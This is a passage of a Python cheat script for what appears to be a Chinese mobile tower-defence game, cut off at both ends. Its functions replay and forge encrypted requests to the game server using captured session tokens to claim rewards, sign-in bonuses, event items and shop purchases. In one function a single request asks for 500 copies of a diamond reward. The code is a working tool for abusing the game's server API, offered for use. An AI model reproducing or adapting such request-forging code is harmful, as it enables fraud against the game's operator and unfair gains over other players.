    elif response_data.get("r") == 0:
        print("潘追任务刷新成功")
    else:
        print("潘追任务刷新失败")
    op_value = decrypted_json["e"]["d"][0].get("op")
    if op_value == 0 or op_value == None:
        print("活动未开启")
    elif op_value == 1:
        score = int(json.loads(decrypted_json['e']['d'][0]['data'])['score'])
        data_str = decrypted_json['e']['d'][0]['data']
        data_dict = json.loads(data_str)
        nb_list = data_dict['nb']
        i_list = []
        for index, item in enumerate(nb_list):
            if item.get('s') == 0:
                i_list.append(index)
        botm_list = [int(key) for key in data_dict['botm'].keys()]
        dt_list = data_dict['dt']
        filtered_list = [item for item in botm_list if item not in dt_list]
        ti_value = filtered_list[0] if filtered_list else None
        if score < 300:
            si = 300 - score
            data = {"req":"V795","e":{"ai":"10803","g":"1","pi":pi,"s":si,"sk":sk,"ti":ti_value,"ui":ui},"ev":3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("潘追任务领取成功")
            else:
                print("潘追任务领取失败")
        else:
            print("线索已足够")
        for i_value in i_list:
            data ={"req":"V792","e":{"ai":"10803","i":i_value,"pi":pi,"sk":sk,"t":"1","ui":ui},"ev":3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 20013:
                print("当前请求文本已过期，需重新抓包")
            elif response_data.get("r") == 0:
                print("潘追奖励领取成功")
            else:
                print("潘追奖励领取失败")
def run_twenty_eighth_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V303", "e": {"al": [{"id": 10800, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi":pi, "sk": sk, "ui":ui, "v": 版本号}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    data_str = decrypted_json['e']['d'][0]['data']
    data_dict = json.loads(data_str)
    lms_list = data_dict['lms']
    level_max_scores = {}
    for level, sub_list in enumerate(lms_list, start=1):
        num_list = [int(item) for item in sub_list]
        max_score = max(num_list)
        level_max_scores[level] = max_score
    bms_list = data_dict['bms']
    zombie_boss_scores = {}
    for boss_level, score in enumerate(bms_list, start=1):
        zombie_boss_scores[boss_level] = int(score)
    print("=== 各关卡最高分数 ===\n")
    for level, max_score in sorted(level_max_scores.items()):
        print(f"第{level}关最高分数：{max_score}")
    print("\n=== 僵博关卡分数 ===\n")
    for boss_level, score in sorted(zombie_boss_scores.items()):
        print(f"僵博第{boss_level}关分数：{score}")
    data = {"req":"V933","e":{"pi":pi,"sk":sk,"ui":ui},"ev":3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    lb_data = decrypted_json["e"]["d"]["lb"]
    print("\n=== 追击排行榜 ===\n")
    my_nick = _get_player_nickname() or "我"
    for rank, item in enumerate(lb_data, 1):
        n_value = item["n"]
        s_value = item["s"]
        hi_value = int(item.get("hi", 0))
        my_ui = str(ui)
        is_me = False
        for key, value in item.items():
            if key not in ('n', 's') and str(value) == my_ui:
                is_me = True
                break
        if is_me:
            tag = "[我]"
            n_value = my_nick
        elif hi_value == 0:
            tag = "[人机]"
        else:
            tag = "[真人]"
        if tag == "[我]":
            print(f' {C.Y}{rank}. {tag} {n_value}: {s_value} ← 你在这{C.R}')
        else:
            print(f' {rank}. {tag} {n_value}: {s_value}')
def run_twenty_ninth_script():
    pi, ui, sk = get_pi_sk(加密)
    data={"req": "V998", "e": {"pi": pi, "sk": sk, "ui": ui}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 0:
        print("签到领取成功")
    else:
        print("签到领取失败")
    time.sleep(0.1)
    data={"req": "V303", "e": {"al": [{"id": 10828, "abi": 0, "type": 1, "config_version": 1}], "ci": "0", "cs": "0", "pack": 渠道, "pi": pi, "rv": "5", "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 0:
        print("指南刷新成功")
    else:
        print("指南刷新失败")
    time.sleep(0.1)
    for i in range(7):
        data={"req": "V951", "e": {"ai": "10828", "i": 1000+i+1, "pi": pi, "sk": sk, "t": "1", "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 0:
            print("七日指南第1天领取成功")
        else:
            print("七日指南第1天领取失败")
        time.sleep(0.1)
    for i in range(7):
        data={"req": "V951", "e": {"ai": "10828", "i": 2000+i+1, "pi": pi, "sk": sk, "t": "1", "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 0:
            print("七日指南第2天领取成功")
        else:
            print("七日指南第2天领取失败")
        time.sleep(0.1)
    for i in range(7):
        data={"req": "V951", "e": {"ai": "10828", "i": 3000+i+1, "pi": pi, "sk": sk, "t": "1", "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 0:
            print("七日指南第3天领取成功")
        else:
            print("七日指南第3天领取失败")
        time.sleep(0.1)
    for i in range(7):
        data={"req": "V951", "e": {"ai": "10828", "i": 4000+i+1, "pi": pi, "sk": sk, "t": "1", "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 0:
            print("七日指南第4天领取成功")
        else:
            print("七日指南第4天领取失败")
        time.sleep(0.1)
    for i in range(7):
        data={"req": "V951", "e": {"ai": "10828", "i": 5000+i+1, "pi": pi, "sk": sk, "t": "1", "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 0:
            print("七日指南第5天领取成功")
        else:
            print("七日指南第5天领取失败")
        time.sleep(0.1)
    for i in range(7):
        data={"req": "V951", "e": {"ai": "10828", "i": 6000+i+1, "pi": pi, "sk": sk, "t": "1", "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 0:
            print("七日指南第6天领取成功")
        else:
            print("七日指南第6天领取失败")
        time.sleep(0.1)
    for i in range(7):
        data={"req": "V951", "e": {"ai": "10828", "i": 7000+i+1, "pi": pi, "sk": sk, "t": "1", "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 0:
            print("七日指南第7天领取成功")
        else:
            print("七日指南第7天领取失败")
        time.sleep(0.1)
    for i in range(7):
        data={"req": "V951", "e": {"ai": "10828", "i": i, "pi": pi, "sk": sk, "t": "2", "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 0:
            print("七日指南进度条领取成功")
        else:
            print("七日指南进度条领取失败")
        time.sleep(0.1)
    data={"req": "V303", "e": {"al": [{"id": 10876, "abi": 0, "type": 1, "config_version": 1}], "ci": "0", "cs": "0", "pack": 渠道, "pi": pi, "rv": "5", "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    response_data = json.loads(response.text)
    if response_data.get("r") == 0:
        op_value = decrypted_json["e"]["d"][0].get("op")
        if op_value == 0 or op_value == None:
            print("活动未开启")
        elif op_value == 1:
            bl_data = json.loads(decrypted_json["e"]["d"][0]["data"])["bl"]
            i_values = [item["i"] for sublist in bl_data for item in sublist]
            if 21070 in i_values or 21051 in i_values:
                data = {"req": "V1008", "e": {"id": "7", "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                response_data = json.loads(response.text)
                if response_data.get("r") == 0:
                    print("挂件购买成功")
                else:
                    print("挂件购买失败")
            time.sleep(0.1)
            data={"req": "V1008", "e": {"id": "6", "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            response_data = json.loads(response.text)
            if response_data.get("r") == 0:
                print("秘宝券购买成功")
            else:
                print("秘宝券购买失败")
            time.sleep(0.1)
    else:
        print("商店刷新失败")
    time.sleep(0.1)

def run_thirtieth_script():
    pi, ui, sk = get_pi_sk(加密)
    data={"req": "V303", "e": {"al": [{"id": 10843, "abi": 0, "type": 1, "config_version": 1}], "ci": "0", "cs": "0", "pack": 渠道, "pi": pi, "rv": "5", "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
    data_str = json.dumps(data, separators=(',', ':'))
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 0:
        print("课堂刷新成功")
    else:
        print("课堂刷新失败")
    time.sleep(0.1)
    i = 0
    s = 0
    for count in range(20):
        data = {"req":"V760","e":{"i":str(i),"pi":pi,"s":str(s),"sk":sk,"ui":ui},"ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 0:
            print("潘妮课堂过关成功")
        else:
            print("潘妮课堂过关失败")
        i += 1
        if i > 4:
            i = 0
            s += 1
def run_thirtieth_first_script():
   pi, ui, sk = get_pi_sk(加密)
   data = {"req": "V795", "e": {"ai": "10749", "g": "1", "pi": pi, "s": "300", "sk": sk, "ti": "1001", "ui": ui}, "ev": 3}
   encrypted_data, head = get_encrypted_data(data, url)
   response = _do_post(head, encrypted_data, data)
   response_data = json.loads(response.text)
   if response_data.get("r") == 0:
            print("戴夫宝藏领取成功")
   else:
            print("戴夫宝藏领取失败")
   for i in range(6):
    try:
        pi, ui, sk = get_pi_sk(加密)
        data = {"req": "V792", "e": {"ai": "10749", "i": i, "pi": pi, "sk": sk, "t": "1", "ui": ui}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("戴夫宝藏领取成功")
        else:
            print("戴夫宝藏领取失败")
    except Exception as e:
        print(f"Iteration {i + 1} failed with error: {e}")
def run_thirtieth_second_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V316", "e": {"b": "0", "n": "", "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    uk_value = decrypted_json['e']['d']['p']['uk']
    uk_value = int(uk_value)
    uki = uk_value + 1
    shijie = "safe22_hard_level_reward"
    data = {"req": "V302","e": {"nfc": "1","o": [{"i": "3008", "q": 50, "f": shijie} for _ in range(500)],"pi": pi,"sk": sk,"ui": ui,"uk": uki},"ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 20013:
        print("当前请求文本已过期，需重新抓包")
    elif response_data.get("r") == 0:
        print("关卡钻石领取成功")
    else:
        print("关卡钻石领取失败")
def run_thirtieth_third_script():
    """无尽币查询"""
    pi, ui, sk = get_pi_sk(加密)
    # 使用V222请求查询无尽币
    data = {"req": "V222", "e": {"p": {"st": 1, "rs": 0}, "pi": pi, "rv": "5", "sk": sk, "t": "13", "ui": ui}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 20013:
        print("当前请求文本已过期，需重新抓包")
        return
    if response_data.get("r") != 0:
        print("获取无尽币失败")
        return
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    inner_d = decrypted_json.get("e", {}).get("d", {})
    j_data = json.loads(inner_d.get("j", "{}"))
    endless_coin = j_data.get("ems", {}).get("rn", 0)
    print(f"当前无尽币数量: {endless_coin}")

def run_zhaguan_task():
    """砸罐任务领取：刷新、领取锤子、显示信息"""
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V303", "e": {"al": [{"id": 10790, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 20013:
        print("当前请求文本已过期，需重新抓包")
    elif response_data.get("r") == 0:
        print("砸罐刷新成功")
        decrypted_response = get_decrypted_data(url, data=response)
        decrypted_json = json.loads(decrypted_response)
        op_value = decrypted_json["e"]["d"][0].get("op")
        if op_value == 0 or op_value == None:
            print("活动未开启")
            return
        elif op_value == 1:
            data_str = decrypted_json['e']['d'][0]['data']
            data_dict = json.loads(data_str)
            ftl = data_dict['ftl']
            ftfl = data_dict['ftfl']
            ftl_values = list(set(ftl) - set(ftfl)) + list(set(ftfl) - set(ftl))
            for ftl in ftl_values:
                data = {"req": "V920", "e": {"i": ftl, "pi": pi, "sk": sk, "t": "1", "ui": ui}, "ev": 3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                response_data = json.loads(response.text)
                if response_data.get("r") == 20013:
                    print("当前请求文本已过期，需重新抓包")
                elif response_data.get("r") == 0:
                    print("锤子领取成功")
                else:
                    print("锤子领取失败")
            data = {"req": "V303", "e": {"al": [{"id": 10790, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
            encrypted_data, head = get_encrypted_data(data, url)
            response = _do_post(head, encrypted_data, data)
            decrypted_response = get_decrypted_data(url, data=response)
            decrypted_json = json.loads(decrypted_response)
            data_str = decrypted_json['e']['d'][0]['data']
            data_dict = json.loads(data_str)
            h_value = data_dict['h']
            print(f"当前拥有的锤子数量:{h_value}")
            rl_list = data_dict['rl']
            total_w = sum(item['w'] for item in rl_list)
            result = []
            for item in rl_list:
                str_i = str(item["i"])
                plant_info = formatted_plant.get(
                    str_i,
                    {"name": f"未知物品({str_i})", "pinzhi": "default"}
                )
                plant_name = plant_info["name"]
                plant_pinzhi = plant_info["pinzhi"]
                color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                w_percent = round((item["w"] / total_w) * 100, 2)
                result.append({
                    "colored_name": f"{color_code}{plant_name}{RESET_COLOR}",
                    "quantity": item["q"],
                    "weight_percent": w_percent
                })
            for item in result:
                print(f"{item['colored_name']}×{item['quantity']}   概率{item['weight_percent']}%")
            gl_list = data_dict['gl']
            gl_chinese = []
            for num in gl_list:
                str_i = str(num)
                plant_info = formatted_plant.get(
                    str_i,
                    {"name": f"未知物品({str_i})", "pinzhi": "default"}
                )
                plant_name = plant_info["name"]
                plant_pinzhi = plant_info["pinzhi"]
                color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                gl_chinese.append({
                    "colored_name": f"{color_code}{plant_name}{RESET_COLOR}"
                })
            print("\n目前轮次已获得的物品有：")
            if gl_chinese:
                for idx, item in enumerate(gl_chinese, 1):
                    print(f"{idx}. {item['colored_name']}")
            else:
                print("暂无已获得物品")
    else:
        print("砸罐刷新失败")

def run_zhaguan():
    """砸罐：砸罐子交互功能"""
    while True:
        pi, ui, sk = get_pi_sk(加密)
        data = {"req": "V303", "e": {"al": [{"id": 10790, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
            break
        elif response_data.get("r") == 0:
            decrypted_response = get_decrypted_data(url, data=response)
            decrypted_json = json.loads(decrypted_response)
            op_value = decrypted_json["e"]["d"][0].get("op")
            if op_value == 0 or op_value == None:
                print("活动未开启")
                break
            elif op_value == 1:
                data_str = decrypted_json['e']['d'][0]['data']
                data_dict = json.loads(data_str)
                h_value = data_dict['h']
                print(f"当前拥有的锤子数量:{h_value}")
                user_input = input("\n请输入选择(1.砸罐子  2.重置  空回车.退出)：").strip()
                if user_input == "1":
                    id_value = random.randint(1, 8)
                    data = {"req": "V918", "e": {"i": id_value, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
                    encrypted_data, head = get_encrypted_data(data, url)
                    response = _do_post(head, encrypted_data, data)
                    response_data = json.loads(response.text)
                    if response_data.get("r") == 0:
                        decrypted_response = get_decrypted_data(url, data=response)
                        decrypted_json = json.loads(decrypted_response)
                        b_dict = decrypted_json['e']['d']['b']
                        i_value = str(b_dict['i'])
                        q_value = b_dict['q']
                        plant_info = formatted_plant.get(
                            i_value,
                            {"name": f"未知物品({i_value})", "pinzhi": "default"}
                        )
                        plant_name = plant_info["name"]
                        plant_pinzhi = plant_info["pinzhi"]
                        color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                        print(f"获得的道具为: {color_code}{plant_name}{RESET_COLOR}×{q_value}")
                    elif response_data.get("r") == 45031:
                        print("锤子不足")
                    else:
                        print("获取失败")
                elif user_input == "2":
                    data = {"req": "V919", "e": {"f": "0", "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
                    encrypted_data, head = get_encrypted_data(data, url)
                    response = _do_post(head, encrypted_data, data)
                    response_data = json.loads(response.text)
                    if response_data.get("r") == 20013:
                        print("当前请求文本已过期，需重新抓包")
                    elif response_data.get("r") == 0:
                        print("重置成功")
                    elif response_data.get("r") == 45031:
                        print("锤子不足")
                    else:
                        print("重置失败")
                elif user_input == "":
                    print("\n程序已退出")
                    break
                else:
                    print("\n输入无效！仅支持输入 1、2 或直接回车退出")
        else:
            print("砸罐刷新失败")
            break

def run_thirtieth_fourth_script():
    while True:
        pi, ui, sk = get_pi_sk(加密)
        data = {"req": "V303", "e": {"al": [{"id": 10790, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
        encrypted_data, head = get_encrypted_data(data, url)
        response = _do_post(head, encrypted_data, data)
        response_data = json.loads(response.text)
        if response_data.get("r") == 20013:
            print("当前请求文本已过期，需重新抓包")
        elif response_data.get("r") == 0:
            print("砸罐刷新成功")
            decrypted_response = get_decrypted_data(url, data=response)
            decrypted_json = json.loads(decrypted_response)
            op_value = decrypted_json["e"]["d"][0].get("op")
            if op_value == 0 or op_value == None:
                print("活动未开启")
                break
            elif op_value == 1:
                data_str = decrypted_json['e']['d'][0]['data']
                data_dict = json.loads(data_str)
                ftl = data_dict['ftl']
                ftfl = data_dict['ftfl']
                ftl_values = list(set(ftl) - set(ftfl)) + list(set(ftfl) - set(ftl))
                for ftl in ftl_values:
                    data = {"req": "V920", "e": {"i": ftl, "pi": pi, "sk": sk, "t": "1", "ui": ui}, "ev": 3}
                    encrypted_data, head = get_encrypted_data(data, url)
                    response = _do_post(head, encrypted_data, data)
                    response_data = json.loads(response.text)
                    if response_data.get("r") == 20013:
                        print("当前请求文本已过期，需重新抓包")
                    elif response_data.get("r") == 0:
                        print("锤子领取成功")
                    else:
                        print("锤子领取失败")
                data = {"req": "V303", "e": {"al": [{"id": 10790, "abi": 0, "type": 1, "config_version": 1}], "ci": "93", "cs": "0", "pack": 渠道, "pi": pi, "sk": sk, "ui": ui, "v": 版本号}, "ev": 3}
                encrypted_data, head = get_encrypted_data(data, url)
                response = _do_post(head, encrypted_data, data)
                decrypted_response = get_decrypted_data(url, data=response)
                decrypted_json = json.loads(decrypted_response)
                data_str = decrypted_json['e']['d'][0]['data']
                data_dict = json.loads(data_str)
                h_value = data_dict['h']
                print(f"当前拥有的锤子数量:{h_value}")
                rl_list = data_dict['rl']
                total_w = sum(item['w'] for item in rl_list)
                result = []
                for item in rl_list:
                    str_i = str(item["i"])
                    plant_info = formatted_plant.get(
                        str_i,
                        {"name": f"未知物品({str_i})", "pinzhi": "default"}
                    )
                    plant_name = plant_info["name"]
                    plant_pinzhi = plant_info["pinzhi"]
                    color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                    w_percent = round((item["w"] / total_w) * 100, 2)
                    result.append({
                        "colored_name": f"{color_code}{plant_name}{RESET_COLOR}",
                        "quantity": item["q"],
                        "weight_percent": w_percent
                    })
                for item in result:
                    print(f"{item['colored_name']}×{item['quantity']}   概率{item['weight_percent']}%")
                gl_list = data_dict['gl']
                gl_chinese = []
                for num in gl_list:
                    str_i = str(num)
                    plant_info = formatted_plant.get(
                        str_i,
                        {"name": f"未知物品({str_i})", "pinzhi": "default"}
                    )
                    plant_name = plant_info["name"]
                    plant_pinzhi = plant_info["pinzhi"]
                    color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                    gl_chinese.append({
                        "colored_name": f"{color_code}{plant_name}{RESET_COLOR}"
                    })
                print("\n目前轮次已获得的物品有：")
                if gl_chinese:
                    for idx, item in enumerate(gl_chinese, 1):
                        print(f"{idx}. {item['colored_name']}")
                else:
                    print("暂无已获得物品")
                user_input = input("\n请输入选择(1.砸罐子  2.重置  空回车.退出)：").strip()
                if user_input == "1":
                    id_value = random.randint(1, 8)
                    data = {"req": "V918", "e": {"i": id_value, "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
                    encrypted_data, head = get_encrypted_data(data, url)
                    response = _do_post(head, encrypted_data, data)
                    response_data = json.loads(response.text)
                    if response_data.get("r") == 0:
                        decrypted_response = get_decrypted_data(url, data=response)
                        decrypted_json = json.loads(decrypted_response)
                        b_dict = decrypted_json['e']['d']['b']
                        i_value = str(b_dict['i'])
                        q_value = b_dict['q']
                        plant_info = formatted_plant.get(
                            i_value,
                            {"name": f"未知物品({i_value})", "pinzhi": "default"}
                        )
                        plant_name = plant_info["name"]
                        plant_pinzhi = plant_info["pinzhi"]
                        color_code = pinzhi_to_color.get(plant_pinzhi, pinzhi_to_color["default"])
                        print(f"获得的道具为: {color_code}{plant_name}{RESET_COLOR}×{q_value}")
                    elif response_data.get("r") == 45031:
                        print("锤子不足")
                    else:
                        print("获取失败")
                elif user_input == "2":
                    data = {"req": "V919", "e": {"f": "0", "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
                    encrypted_data, head = get_encrypted_data(data, url)
                    response = _do_post(head, encrypted_data, data)
                    response_data = json.loads(response.text)
                    if response_data.get("r") == 20013:
                        print("当前请求文本已过期，需重新抓包")
                    elif response_data.get("r") == 0:
                        print("重置成功")
                    elif response_data.get("r") == 45031:
                        print("锤子不足")
                    else:
                        print("重置失败")
                elif user_input == "":
                    print("\n程序已退出")
                    break
                else:
                    print("\n输入无效！仅支持输入 1、2 或直接回车退出")
        else:
            print("砸罐刷新失败")
def run_thirtieth_fifth_script():
    pi, ui, sk = get_pi_sk(加密)
    data ={"req":"V900","e":{"pi":pi,"pl":[{"i":60006,"q":1},{"i":60004,"q":1},{"i":60003,"q":1}],"sk":sk,"ui":ui},"ev":3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    response_data = json.loads(response.text)
    if response_data.get("r") == 20013:
        print("当前请求文本已过期，需重新抓包")
    elif response_data.get("r") == 0:
        print("神器领取成功")
    else:
        print("神器领取失败")
def run_thirtieth_sixth_script():
    pi, ui, sk = get_pi_sk(加密)
    data = {"req": "V316", "e": {"b": "0", "n": "", "pi": pi, "sk": sk, "ui": ui}, "ev": 3}
    encrypted_data, head = get_encrypted_data(data, url)
    response = _do_post(head, encrypted_data, data)
    decrypted_response = get_decrypted_data(url, data=response)
    decrypted_json = json.loads(decrypted_response)
    pcl_list = decrypted_json['e']['d'].get('pcl', [])
    pl_list = decrypted_json['e']['d'].get('pl', [])
    for item in pl_list:
        i_value = item['i']
        s_value = item['s']
        found = False
        jieshu_value = None
        for plant_dict in plant_list:
            plant_id = next(iter(plant_dict))
            if int(plant_id) == int(i_value):
                found = True
                jieshu_value = plant_dict.get('jieshu')
                break
        if found:
            s_int = int(s_value)
            jieshu_int = int(jieshu_value)
            if s_int > jieshu_int:
                item['s'] = jieshu_value
            else:
                pass
        else:
            print(f"植物编号 {i_value} 在 p_list 中未找到，跳过")
    for item in pl_list:
        i_original = int(item['i'])
        if i_original < 2000 or 100000 < i_original < 190000:
            i_new = i_original + 100
        elif 199999 < i_original < 1000000:
            i_new = i_original * 10 + 20000000
        else:
            i_new = i_original
        item['i'] = str(i_new)
        s = int(item['s'])
        item['q'] = 10 if s == 0 else 40 if s == 1 else 90 if s == 2 else 140 if s == 3 else 220 if s == 4 else 0
        del item['s']
    merged = {}
    for item in pl_list + pcl_list:
        i, q = item['i'], int(item['q'])
        merged[i] = merged.get(i, 0) + q
    suipian_list = [{'i': i, 'q': q} for i, q in merged.items()]
    zhuanjiyin_list = []
    for item in suipian_list:
        if item['q'] > 220:
            new_item = item.copy()
            new_item['q'] = new_item['q'] - 220
            zhuanjiyin_list.append(new_item)
    baise_list=['1101','1102','1103','1104','1105','1106','1110','1111','1115','1116','1118','1121','1133','1134','1135','1136','1138','1149','1150','1153','1154','1155','1156','1157','1164','1166','1179','1194','111106','111110','111141','111164','111165','22000170','22000300','22001380']
    lvse_list=['1107','1119','1120','1122','1124','1125','1128','1129','1130','1137','1142','1163','1173','1176','1178','1182','1183','1184','1185','1188','1189','1190','1192','1195','111103','111114','111127','111128','111137','111152','111153','111191','22000030','22000180','22001370']
    lanse_list=['1108','1109','1113','1114','1117','1127','1132','1139','1140','1141','1144','1147','1151','1160','1162','1168','1169','1170','1174','1175','1177','1180','1186','1191','1198','111101','111104','111108','111109','111111','111112','111113','111115','111117','111118','111123','111125','111126','111135','111136','111138','111151','111156','111168','22000160','22000430','22001260','22001360']
    zise_list=['1123','1126','1159','1161','1172','1181','1193','1199','111102','111116','111120','111124','111134','111139','111140','111154','111158','111162','111163','111166','111169','111173','111176','111178','111184','111186','111187','111189','22000010','22000070','22000110','22000130','22000140','22000270','22000490','22000500','22001350','22001420','22001570']
    chengse_list=['1112','1131','1143','1152','1158','1165','1167','1171','1197','111119','111121','111122','111129','111130','111131','111132','111133','111142','111143','111144','111146','111147','111148','111149','111150','111155','111160','111161','111171','111172','111174','111175','111179','111181','111182','111185','111188','111190','22000000','22000020','22000040','22000050','22000060','22000080','22000090','22000100','22000120','22000150','22000190','22000200','22000210','22000220','22000230','22000240','22000250','22000260','22000280','22000290','22000310','22000320','22000330','22000350','22000370','22000380','22000410','22000440','22000450','22000460','22000470','22000480','22000490','22000520','22000530','22000540','22000550','22000560','22000570','22000590','22000610','22000620','22000630','22000640','22000650','22000660','22000670','22000680','22000690','22000710','22000720','22000730','22000740','22000750','22000760','22000770','22000780','22000800','22000810','22000820','22000840','22000850','22000860','22000880','22000890','22000900','22000910','22000920','22000930','22000940','22000950','22000960','22000970','22000990','22001000','22001010','22001020','22001270','22001580','22001620','22001750']
    color_lists = {'bai': baise_list,'lv': lvse_list,'lan': lanse_list,'zi': zise_list,'cheng': chengse_list}
    bai_list = []
    lv_list = []
    lan_list = []
    zi_list = []
    cheng_list = []
    for item in zhuanjiyin_list:
        i_str = item['i']
        q = item['q']
        for color_key, color_values in color_lists.items():
            if i_str in color_values:
                i_int = int(i_str)
                repeated = [i_int] * q
                if color_key == 'bai':
                    bai_list.extend(repeated)
                elif color_key == 'lv':
                    lv_list.extend(repeated)
                elif color_key == 'lan':
                    lan_list.extend(repeated)
                elif color_key == 'zi':
                    zi_list.extend(repeated)
                elif color_key == 'cheng':
                    cheng_list.extend(repeated)
    materials = [bai_list, lv_list, lan_list, zi_list, cheng_list]
    choice = input(""" 1. 橙色
 2. 紫色
 3. 蓝色
 4. 绿色
 5. 白色
请选择颜色: """)
    formula_map = {
        "1": [
            {"needs": [1, 0, 1, 2, 1], "desc": "1白+1蓝+2紫+1橙"},
            {"needs": [0, 1, 1, 2, 1], "desc": "1绿+1蓝+2紫+1橙"},
            {"needs": [0, 0, 2, 2, 1], "desc": "2蓝+2紫+1橙"},
            {"needs": [0, 0, 0, 3, 1], "desc": "3紫+1橙"},
            {"needs": [0, 0, 0, 5, 0], "desc": "5紫"},
            {"needs": [0, 0, 0, 0, 2], "desc": "2橙"}
        ],
        "2": [
            {"needs": [2, 0, 2, 1, 0], "desc": "2白+2蓝+1紫"},
            {"needs": [0, 1, 2, 1, 0], "desc": "1绿+2蓝+1紫"},
            {"needs": [0, 3, 1, 1, 0], "desc": "3绿+1蓝+1紫"},
            {"needs": [0, 0, 5, 0, 0], "desc": "5蓝"},
